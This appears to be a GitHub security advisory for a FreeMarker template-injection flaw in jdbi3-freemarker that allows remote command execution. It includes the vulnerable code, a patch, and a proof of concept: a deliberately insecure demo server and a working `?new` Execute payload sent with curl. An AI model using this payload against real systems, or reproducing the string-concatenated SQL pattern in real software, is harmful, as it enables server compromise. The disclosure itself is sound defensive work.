# [H] jdbi3-freemarker Vulnerable to Improper Neutralization of Special Elements Used in FreeMarker Template Engine

## Summary
Severity: High
Advisory: GHSA-mggx-p7jf-jgw4
CWE: CWE-1336, CWE-94
Ecosystem: Maven
CVSS: CVSS:4.0/AV:N/AC:L/AT:P/PR:H/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N (CVSS_V4)
Published: 2026-05-05
Source: https://github.com/advisories/GHSA-mggx-p7jf-jgw4
Type: github-advisory

## Affected
- Maven: `org.jdbi:jdbi3-freemarker` — affected >=0 <3.53.0

## Details
# Summary

**Description**

An Improper Neutralization of Special Elements Used in a Template Engine (CWE-1336) vulnerability in Jdbi allows arbitrary command execution when an application using `jdbi3-freemarker` permits attacker-influenced text to reach `FreemarkerEngine.parse()` as template source. This affects `org.jdbi:jdbi3-freemarker` through version 3.52.1.

The developer opts into FreeMarker-backed SQL templating, but does not explicitly opt into reflective Java class loading from template source.

Jdbi’s FreeMarker integration should not expose unrestricted Java class instantiation by default in a SQL templating module. While the SQL injection risk is acknowledged, Jdbi’s documentation explicitly supports and demonstrates dynamic SQL templating through defined attributes, including substitution of non-bindable SQL elements such `ORDER BY` columns. 
## Details

Jdbi constructs the underlying `freemarker.template.Configuration` with `DEFAULT_INCOMPATIBLE_IMPROVEMENTS` and never installs a `TemplateClassResolver`, so Freemarker's legacy `UNRESTRICTED_RESOLVER` remains active and the `?new` built-in can instantiate arbitrary classes, including `freemarker.template.utility.Execute`.

Two `Configuration` instances are constructed in the module, neither of which is hardened:
```java
// freemarker/src/main/java/org/jdbi/v3/freemarker/FreemarkerConfig.java
public FreemarkerConfig() {
    freemarkerConfiguration = new Configuration(Configuration.DEFAULT_INCOMPATIBLE_IMPROVEMENTS);
    freemarkerConfiguration.setTemplateLoader(new ClassTemplateLoader(selectClassLoader(), "/"));
    freemarkerConfiguration.setNumberFormat("computer");
}
```

```java
// freemarker/src/main/java/org/jdbi/v3/freemarker/FreemarkerSqlLocator.java
static {
    Configuration c = new Configuration(Configuration.DEFAULT_INCOMPATIBLE_IMPROVEMENTS);
    c.setTemplateLoader(new ClassTemplateLoader(selectClassLoader(), "/"));
    c.setNumberFormat("computer");
    CONFIGURATION = c;
}
```
The locator's `CONFIGURATION` is initialized once at class load and used by the deprecated static `findTemplate(Class, String)`. It cannot be replaced via `FreemarkerConfig#setFreemarkerConfiguration(...)`, so any fix must land in both call sites.

The sink is `FreemarkerEngine.parse()`, which constructs a `Template` from the raw SQL string and renders it against `ctx.getAttributes()`:
```java
// freemarker/src/main/java/org/jdbi/v3/freemarker/FreemarkerEngine.java
Template template = new Template(null, sqlTemplate,
        config.get(FreemarkerConfig.class).getFreemarkerConfiguration());
return Optional.of(ctx -> {
    StringWriter writer = new StringWriter();
    template.process(ctx.getAttributes(), writer);
    return writer.toString();
});
```

Freemarker is the only built-in engine whose parse path provides reflective class loading by default.
## Impact

This impacts all `jdbi3-freemarker` releases through 3.52.1. Exploitation requires that an application depend on `jdbi3-freemarker`and allow request-derived text to flow into a SQL template body passed to `Handle.createQuery(String)`, `createUpdate(String)`, `createCall(String)`, `createScript(String)`, or `Batch.add(String)`, or into a defined attribute that the template subsequently re-evaluates with `?eval` or `?interpret`.

An application that allows attacker-influenced text to become FreeMarker template source, either directly through a SQL string passed to Jdbi or indirectly through a trusted template that applies `?eval` / `?interpret` to an attacker-influenced defined attribute, can become an RCE sink in the application JVM.
## Proposed Patch

The injection surface is the `Configuration` constructed by Jdbi on the application's behalf without a class-resolver policy.

`FreemarkerConfig` and `FreemarkerSqlLocator`'s static initializer should not allow SQL templates to instantiate arbitrary Java classes by default. Callers that genuinely need reflective `?new` can override the `Configuration` via `FreemarkerConfig#setFreemarkerConfiguration(...)`.

The static `CONFIGURATION` field cannot be reconfigured by application code at runtime, so a fix limited to `FreemarkerConfig` leaves the legacy locator path exploitable.
```java
import freemarker.core.TemplateClassResolver;

// FreemarkerConfig.java
public FreemarkerConfig() {
    freemarkerConfiguration = new Configuration(Configuration.DEFAULT_INCOMPATIBLE_IMPROVEMENTS);
    freemarkerConfiguration.setTemplateLoader(new ClassTemplateLoader(selectClassLoader(), "/"));
    freemarkerConfiguration.setNumberFormat("computer");
    freemarkerConfiguration.setNewBuiltinClassResolver(TemplateClassResolver.ALLOWS_NOTHING_RESOLVER);
}

// FreemarkerSqlLocator.java
static {
    Configuration c = new Configuration(Configuration.DEFAULT_INCOMPATIBLE_IMPROVEMENTS);
    c.setTemplateLoader(new ClassTemplateLoader(selectClassLoader(), "/"));
    c.setNumberFormat("computer");
    c.setNewBuiltinClassResolver(TemplateClassResolver.ALLOWS_NOTHING_RESOLVER);
    CONFIGURATION = c;
}
```

`ALLOWS_NOTHING_RESOLVER` rejects every `?new` lookup, which is sufficient for SQL templating.`SAFER_RESOLVER` also closes RCE and blocks only `Execute`, `ObjectConstructor`, and `JythonRuntime`, none of which a SQL template would ever need. A complete hardening also restricts the template loader to a non-root prefix.

## Proof of Concept

This PoC uses direct string concatenation to simulate an application passing un-sanitized, request-derived text to the SQL template engine. The same RCE payload works if the attacker input is passed through a Jdbi `@Define` attribute that the template subsequently evaluates.
```bash
# Create project directory
mkdir jdbi-freemarker-poc && cd jdbi-freemarker-poc

cat > pom.xml << 'EOF'
<project xmlns="http://maven.apache.org/POM/4.0.0">
  <modelVersion>4.0.0</modelVersion>
  <groupId>poc</groupId>
  <artifactId>jdbi-freemarker-poc</artifactId>
  <version>1.0</version>
  <properties>
    <maven.compiler.release>17</maven.compiler.release>
    <project.build.sourceEncoding>UTF-8</project.build.sourceEncoding>
  </properties>
  <dependencies>
    <dependency>
      <groupId>org.jdbi</groupId>
      <artifactId>jdbi3-core</artifactId>
      <version>3.52.1</version>
    </dependency>
    <dependency>
      <groupId>org.jdbi</groupId>
      <artifactId>jdbi3-freemarker</artifactId>
      <version>3.52.1</version>
    </dependency>
    <dependency>
      <groupId>com.h2database</groupId>
      <artifactId>h2</artifactId>
      <version>2.2.224</version>
    </dependency>
  </dependencies>
  <build>
    <plugins>
      <plugin>
        <groupId>org.apache.maven.plugins</groupId>
        <artifactId>maven-compiler-plugin</artifactId>
        <version>3.13.0</version>
      </plugin>
    </plugins>
  </build>
</project>
EOF

mkdir -p src/main/java
cat > src/main/java/Server.java << 'EOF'
import com.sun.net.httpserver.HttpServer;
import org.jdbi.v3.core.Jdbi;
import org.jdbi.v3.core.statement.SqlStatements;
import org.jdbi.v3.freemarker.FreemarkerEngine;

import java.net.InetSocketAddress;
import java.net.URLDecoder;
import java.nio.charset.StandardCharsets;
import java.util.HashMap;
import java.util.Map;

public class Server {
    public static void main(String[] args) throws Exception {
        Jdbi jdbi = Jdbi.create("jdbc:h2:mem:poc;DB_CLOSE_DELAY=-1");
        jdbi.getConfig(SqlStatements.class)
            .setTemplateEngine(FreemarkerEngine.instance());
        jdbi.useHandle(h -> {
            h.execute("create table users (id int, email varchar)");
            h.execute("insert into users values (1,'alice@example.com'),(2,'bob@example.com')");
        });

        HttpServer http = HttpServer.create(new InetSocketAddress(8050), 0);
        http.createContext("/search", ex -> {
            String q = parseQuery(ex.getRequestURI().getRawQuery()).getOrDefault("q", "");
            String sql = "select email from users where email like '%" + q + "%'";
            String body;
            try {
                body = jdbi.withHandle(h ->
                    h.createQuery(sql).mapTo(String.class).list().toString());
            } catch (Exception e) {
                body = "error: " + e.getMessage();
            }
            byte[] bytes = body.getBytes(StandardCharsets.UTF_8);
            ex.sendResponseHeaders(200, bytes.length);
            ex.getResponseBody().write(bytes);
            ex.close();
        });
        http.start();
        System.out.println("listening on http://127.0.0.1:8050/search?q=...");
    }

    private static Map<String, String> parseQuery(String raw) {
        Map<String, String> out = new HashMap<>();
        if (raw == null) return out;
        for (String pair : raw.split("&")) {
            int eq = pair.indexOf('=');
            if (eq < 0) continue;
            out.put(URLDecoder.decode(pair.substring(0, eq), StandardCharsets.UTF_8),
                    URLDecoder.decode(pair.substring(eq + 1), StandardCharsets.UTF_8));
        }
        return out;
    }
}
EOF

mvn -q package
java -cp "target/classes:$(mvn -q dependency:build-classpath -Dmdep.outputFile=/dev/stdout)" Server &
```

Benign Request
```bash
$ curl -s 'http://127.0.0.1:8050/search?q=alice'
[alice@example.com]
```

Exploit
```bash
$ curl -sG 'http://127.0.0.1:8050/search' \
    --data-urlencode 'q=<#assign ex="freemarker.template.utility.Execute"?new()>${ex("touch /tmp/jdbi-pwned")}'
[alice@example.com, bob@example.com]

$ ls -la /tmp/jdbi-pwned
-rw-r--r-- 1 wodzen wodzen 0 Apr 27 02:21 /tmp/jdbi-pwned
```

## References
- https://github.com/jdbi/jdbi/security/advisories/GHSA-mggx-p7jf-jgw4
- https://github.com/jdbi/jdbi
